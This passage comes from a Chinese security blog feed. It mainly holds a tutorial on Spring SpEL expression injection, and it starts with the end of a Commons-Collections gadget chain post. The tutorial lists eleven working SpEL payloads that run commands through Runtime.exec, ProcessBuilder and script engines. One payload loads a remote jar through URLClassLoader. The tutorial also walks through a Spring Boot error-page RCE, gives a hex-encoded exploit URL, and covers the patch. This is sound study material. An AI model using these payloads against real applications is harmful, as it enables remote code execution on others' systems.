alt="image-20220331224824509"></p><p>构造方法把传入的map和Transformer进行赋值。那么要想知道<code>ChainedTransformer</code>是如何调用<code>transform</code>方法，只需在当前类中搜索<code>valueTransformer</code>，因为<code>ChainedTransformer</code>是赋值给<code>valueTransformer</code>的，然后在<code>transformValue</code>方法中发现了transform方法的调用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225033806-1139569585.png" alt="image-20220331225034010"></p><p>继续查找<code>transformValue</code>方法是在哪被调用的，发现在put方法里会调用<code>transformValue</code>方法，从而导致<code>transformValue</code>调用<code>transform</code>方法去执行命令。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225502658-2009025010.png" alt="image-20220331225503104"></p><p>所以我们在调用<code>TransformedMap#decorate</code>方法绑定transformer之后，再调用put方法也可触发命令执行。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225850062-1350949135.png" alt="image-20220331225850271"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13779857.html">https://www.cnblogs.com/nice0e3/p/13779857.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在CC链的前置基础学习完后，就可以开始学习CC链的具体执行流程。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>SpEL表达式注入学习</title>
    <link href="https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-29T02:34:10.000Z</published>
    <updated>2022-03-29T15:03:43.874Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="什么是SpEL表达式"><a href="#什么是SpEL表达式" class="headerlink" title="什么是SpEL表达式"></a>什么是SpEL表达式</h3><p>Spring Expression  Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式语言，一种可贯穿整个 Spring 产品组的语言。这种语言的特性应基于 Spring 产品的需求而设计。<br> Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。</p><span id="more"></span><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>SpEL有三种用法，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p><h4 id="1、-Value"><a href="#1、-Value" class="headerlink" title="1、@Value"></a>1、@Value</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class EmailSender &#123;</span><br><span class="line">    @Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span><br><span class="line">    private String mailUsername;</span><br><span class="line">    @Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)    </span><br><span class="line">    private String defaultLocale;</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、bean配置"><a href="#2、bean配置" class="headerlink" title="2、bean配置"></a>2、bean配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;xxx&quot; class=&quot;com.java.XXXXX.xx&quot;&gt;</span><br><span class="line">    &lt;!-- 同@Value,#&#123;&#125;内是表达式的值，可放在property或constructor-arg内 --&gt;</span><br><span class="line">    &lt;property name=&quot;arg&quot; value=&quot;#&#123;表达式&#125;&quot;&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3、Expression"><a href="#3、Expression" class="headerlink" title="3、Expression"></a>3、Expression</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import org.springframework.expression.Expression;</span><br><span class="line">import org.springframework.expression.ExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"> </span><br><span class="line">public class SpELTest &#123;</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"> </span><br><span class="line">        //创建ExpressionParser解析表达式</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        //表达式放置</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;表达式&quot;);</span><br><span class="line">        //执行表达式，默认容器是spring本身的容器：ApplicationContext</span><br><span class="line">        Object value = exp.getValue();</span><br><span class="line">        </span><br><span class="line">        /**如果使用其他的容器，则用下面的方法*/</span><br><span class="line">        //创建一个虚拟的容器EvaluationContext</span><br><span class="line">        StandardEvaluationContext ctx = new StandardEvaluationContext();</span><br><span class="line">        //向容器内添加bean</span><br><span class="line">        BeanA beanA = new BeanA();</span><br><span class="line">        ctx.setVariable(&quot;bean_id&quot;, beanA);</span><br><span class="line">        </span><br><span class="line">        //setRootObject并非必须；一个EvaluationContext只能有一个RootObject，引用它的属性时，可以不加前缀</span><br><span class="line">        ctx.setRootObject(XXX);</span><br><span class="line">        </span><br><span class="line">        //getValue有参数ctx，从新的容器中根据SpEL表达式获取所需的值</span><br><span class="line">        Object value = exp.getValue(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里接口<code>ExpressionParser</code>负责解析表达式字符串。上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。</p><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-expression&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h4 id="核心接口"><a href="#核心接口" class="headerlink" title="核心接口"></a>核心接口</h4><ol><li>解析器<code>ExpressionParser</code>，用于将字符串表达式转换为<code>Expression</code>表达式对象。</li><li>表达式<code>Expression</code>，最后通过它的<code>getValute</code>方法对表达式进行计算取值。</li><li>上下文<code>EvaluationContext</code>，通过上下文对象结合表达式来计算最后的结果。</li></ol><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>SpEL使用 <code>#&#123;...&#125;</code> 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：</p><blockquote><p>引用其他对象:<code>#&#123;car&#125;</code><br>引用其他对象的属性：<code>#&#123;car.brand&#125;</code><br>调用其它方法 , 还可以链式操作：<code>#&#123;car.toString()&#125;</code></p></blockquote><p>其中属性名称引用还可以用<code>$</code>符号 如：<code>$&#123;someProperty&#125;</code><br>除此以外在SpEL中，使用<code>T()</code>运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的<code>Math</code>类，我们可以像下面的示例这样使用<code>T()</code>运算符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(java.lang.Math)&#125; //结果会返回一个`java.lang.Math`类对象。</span><br></pre></td></tr></table></figure><h4 id="1、类表达式"><a href="#1、类表达式" class="headerlink" title="1、类表达式"></a>1、类表达式</h4><p>SpEL中可以使用特定的Java类型，经常用来访问Java类型中的静态属性或静态方法，需要用<code>T()</code>操作符进行声明。括号中需要包含类名的全限定名，也就是包名加上类名。唯一例外的是，SpEL内置了<code>java.lang</code>包下的类声明，也就是说<code>java.lang.String</code>可以通过<code>T(String)</code>访问，而不需要使用全限定名。<br> 因此我们通过 <code>T()</code> 调用一个类的静态方法，它将返回一个 <code>Class Object</code>，然后再调用相应的方法或属性，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc.exe\&quot;)&quot;);</span><br><span class="line">        Object value = exp.getValue();</span><br></pre></td></tr></table></figure><h4 id="2、方法调用"><a href="#2、方法调用" class="headerlink" title="2、方法调用"></a>2、方法调用</h4><p>使用典型的Java编程语法来调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// string literal, evaluates to &quot;bc&quot;</span><br><span class="line">String c = parser.parseExpression(&quot;&#x27;abc&#x27;.substring(2, 3)&quot;).getValue(String.class);</span><br><span class="line"></span><br><span class="line">// evaluates to true</span><br><span class="line">boolean isMember = parser.parseExpression(&quot;isMember(&#x27;Mihajlo Pupin&#x27;)&quot;).getValue(societyContext,Boolean.class);</span><br></pre></td></tr></table></figure><h4 id="3、调用构造函数"><a href="#3、调用构造函数" class="headerlink" title="3、调用构造函数"></a>3、调用构造函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Inventor einstein = </span><br><span class="line">  p.parseExpression(&quot;new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;,&#x27;German&#x27;)&quot;).getValue(Inventor.class);</span><br><span class="line"> </span><br><span class="line">//create new inventor instance within add method of List</span><br><span class="line">p.parseExpression(&quot;Members.add(new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;, &#x27;German&#x27;))&quot;).getValue(societyContext);</span><br></pre></td></tr></table></figure><h4 id="4、Bean引用"><a href="#4、Bean引用" class="headerlink" title="4、Bean引用"></a>4、Bean引用</h4><p>如果解析上下文已经配置，则可以使用<code>@</code>符号从表达式中查找bean。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser(); StandardEvaluationContext context = new StandardEvaluationContext(); context.setBeanResolver(new MyBeanResolver()); </span><br><span class="line">// This will end up calling resolve(context,&quot;foo&quot;) on MyBeanResolver during evaluation </span><br><span class="line">Object bean = parser.parseExpression(&quot;@foo&quot;).getValue(context);</span><br></pre></td></tr></table></figure><h4 id="5、变量定义"><a href="#5、变量定义" class="headerlink" title="5、变量定义"></a>5、变量定义</h4><p>变量定义通过<code>EvaluationContext</code>接口的<code>setVariable(variableName, value)</code>方法定义；在表达式中使用<code>#variableName</code>引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象，使用<code>#root</code>引用根对象，使用<code>#this</code>引用当前上下文对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">EvaluationContext context = new StandardEvaluationContext(&quot;rui0&quot;);</span><br><span class="line">context.setVariable(&quot;variable&quot;, &quot;ruilin&quot;);</span><br><span class="line">String result1 = parser.parseExpression(&quot;#variable&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line"> </span><br><span class="line">String result2 = parser.parseExpression(&quot;#root&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line">String result3 = parser.parseExpression(&quot;#this&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure><h4 id="6、用户自定义的方法"><a href="#6、用户自定义的方法" class="headerlink" title="6、用户自定义的方法"></a>6、用户自定义的方法</h4><p>用户可以在SpEL注册自定义的方法，将该方法注册到<code>StandardEvaluationContext</code> 中的<code>registerFunction(String name, Method m)</code>方法。<br> 如：我们通过JAVA提供的接口实现字符串反转的方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public abstract class StringUtils &#123;</span><br><span class="line"></span><br><span class="line">  public static String reverseString(String input) &#123;</span><br><span class="line">    StringBuilder backwards = new StringBuilder();</span><br><span class="line">    for (int i = 0; i &lt; input.length(); i++) </span><br><span class="line">      backwards.append(input.charAt(input.length() - 1 - i));</span><br><span class="line">    &#125;</span><br><span class="line">    return backwards.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过如下代码将方法注册到<code>StandardEvaluationContext</code>并且来使用它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">context.registerFunction(&quot;reverseString&quot;,                      StringUtils.class.getDeclaredMethod(&quot;reverseString&quot;,new Class[] &#123; String.class &#125;));</span><br><span class="line">String helloWorldReversed = parser.parseExpression(&quot;#reverseString(&#x27;hello&#x27;)&quot;).getValue(context, String.class);</span><br></pre></td></tr></table></figure><h4 id="7、模板表达式"><a href="#7、模板表达式" class="headerlink" title="7、模板表达式"></a>7、模板表达式</h4><p>表达式模板允许文字文本与一个或多个解析块的混合。 你可以每个解析块分隔前缀和后缀的字符。当然，常见的选择是使用<code>＃&#123;&#125;</code>作为分隔符，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(</span><br><span class="line">        &quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;,</span><br><span class="line">        new TemplateParserContext()).getValue(String.class);</span><br></pre></td></tr></table></figure><p>在<code>ParserContext</code>接口用于影响如何 表达被解析，以便支持所述表达模板的功能。的<code>TemplateParserContext</code>的定义如下所示</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329142052563-1185828549.png" alt="image-20220329142053427"></p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>在不指定<code>EvaluationContext</code>的情况下默认采用的是<code>StandardEvaluationContext</code>，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329144847462-176527755.png" alt="image-20220329144848681"></p><p>看下SpEL提供的两个<code>EvaluationContext</code>的区别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</span><br><span class="line">StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</span><br></pre></td></tr></table></figure><p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p><h3 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、$&#123;12*12&#125;</span><br><span class="line">2、T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)T(Thread).sleep(10000)</span><br><span class="line">3、#this.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br><span class="line">4、new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start()</span><br><span class="line">5、T(java.lang.Runtime).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)</span><br><span class="line">6、T(Runtime).getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;)</span><br><span class="line">7、new javax.script.ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)</span><br><span class="line">8、new javax.script.ScriptEngineManager().getEngineByName(&quot;javascript&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)//调用ScriptEngine，js引擎名称可为[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</span><br><span class="line">9、new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&quot;http://127.0.0.1:8999/Exp.jar&quot;)&#125;).loadClass(&quot;Exp&quot;).getConstructors()[0].newInstance(&quot;127.0.0.1:2333&quot;)//URLClassLoader远程加载class文件，通过函数调用或者静态代码块</span><br><span class="line">10、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)  //AppClassLoader加载</span><br><span class="line">11、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.ProcessBuilder&quot;).getConstructors()[1].newInstance(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start() //AppClassLoader加载</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="SpringBoot-SpEL表达式注入漏洞"><a href="#SpringBoot-SpEL表达式注入漏洞" class="headerlink" title="SpringBoot SpEL表达式注入漏洞"></a>SpringBoot SpEL表达式注入漏洞</h4><p>原理</p><ul><li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li><li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li><li>其中 ${} 包围的内容都会被  <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的  <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ul><p>环境</p><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce</a></p><p>验证</p><p>请求<a href="http://127.0.0.1:9091/article?id=$%7B2*2%7D">http://127.0.0.1:9091/article?id=${2*2}</a></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329171117202-1289875588.png" alt="image-20220329171118750"></p><p>对执行的命令进行十六进制编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">target = &#x27;calc&#x27; # 自己这里是windows环境，所以测试命令用的是calc</span><br><span class="line">for x in target:</span><br><span class="line">    result += hex(ord(x)) + &quot;,&quot;</span><br><span class="line">print(result.rstrip(&#x27;,&#x27;))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将字符串格式转换成 0x** java 字节形式，因为这里会将我们的payload中的单引号和双引号进行编码，导致SpEL表达式解析失败，所以为了方便执行任意代码，可以根据String类的特性传入byte数组：</p><p>分析过程参考：<a href="https://www.cnblogs.com/bitterz/p/15206255.html">https://www.cnblogs.com/bitterz/p/15206255.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125; </span><br></pre></td></tr></table></figure><p>开启调试，造成的原因主要是在<code>ErrorMvcAutoConfiguration.java</code>中的<code>SpelView</code>类，可以看到是在<code>this.helper.replacePlaceholders(this.template, this.resolver)</code>中生成了错误页面，然后返回给result并响应</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329184704655-640679280.png" alt="image-20220329184706224"></p><p>此时map的值如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329185821845-924507104.png" alt="image-20220329185823363"></p><p>其中template内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&lt;div id=&#x27;created&#x27;&gt;$&#123;timestamp&#125;&lt;/div&gt;&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>跟进函数replacePlaceholders</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329190024398-1003926971.png" alt="image-20220329190025935"></p><p>继续跟进while循环中循环解析${}中的 表 达 式 ，例如第一个解析到${timestamp}的表达式</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212020428-2110315097.png" alt="image-20220329212021872"></p><p>然后通过resolvePlaceholder函数进行SpEL解析，跟进即可看到通过getValue方法对SpEL表达式进行解析</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212531370-1367392607.png" alt="image-20220329212532940"></p><p>且<code>EvaluationContext</code>设置的为<code>StandardEvaluationContext</code>，根据前面我们可以知道它允许用户控制输入的情况下可以成功造成任意命令执行</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212843266-47854455.png" alt="image-20220329212845027"></p><p>当解析${message}时，我们跟踪下resolvePlaceholder函数，看看它是怎么处理的</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329214604858-144904379.png" alt="image-20220329214605998"></p><p>通过getValue从Context从取出message的值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329215544902-59410262.png" alt="image-20220329215545883"></p><p>跟进</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220031215-1991450169.png" alt="image-20220329220033014"></p><p>就是对message的值进行html编码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220356553-1188508612.png" alt="image-20220329220358206"></p><p>编码完之后，可以看到message中的双引号被转换为html编码，所以这里编写命令执行的payload，不能带单引号和双引号，这也是为什么采用byte数组传递命令的原因了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220705475-2061816981.png" alt="image-20220329220705931"></p><p>接着往下就又是递归函数，获取proVal中${}中的值，然后进行SpEL表达式解析</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221109578-1370501255.png" alt="image-20220329221111197"></p><p>往下，就是得到${}中的值，然后就是调用resolvePlaceholder进行解析</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221432770-915349157.png" alt="image-20220329221434377"></p><p>跟下，执行到getValue()方法就会对传进去SpEL恶意表达式进行解析，触发命令执行，弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221908395-113622263.png" alt="image-20220329221907429"></p><p>补丁是创建了一个新的<code>NonRecursivePropertyPlaceholderHelper</code>类，来防止递归解析路径中或者名字中含有的表达式。<br>详见： <a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p><p><a href="https://blog.csdn.net/qq_31481187/article/details/108025512">https://blog.csdn.net/qq_31481187/article/details/108025512</a></p><p><a href="https://xz.aliyun.com/t/9245#toc-11">https://xz.aliyun.com/t/9245#toc-11</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

